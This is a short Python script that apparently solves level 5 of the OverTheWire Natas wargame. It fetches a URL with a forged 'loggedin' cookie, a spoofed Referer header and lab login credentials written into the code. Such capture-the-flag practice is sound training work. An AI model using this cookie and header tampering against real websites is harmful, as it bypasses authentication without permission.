#!/bin/python3

import requests
import sys

if len(sys.argv) < 1:
	print(f'Usage: python3 {sys.argv[0]} <url>')
else:
	cookies = dict(loggedin='1')
	r = requests.get(f'{sys.argv[1]}', cookies=cookies, headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'}, auth=('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'))
	print(r.headers)
	print(r.status_code)
	print(r.text)
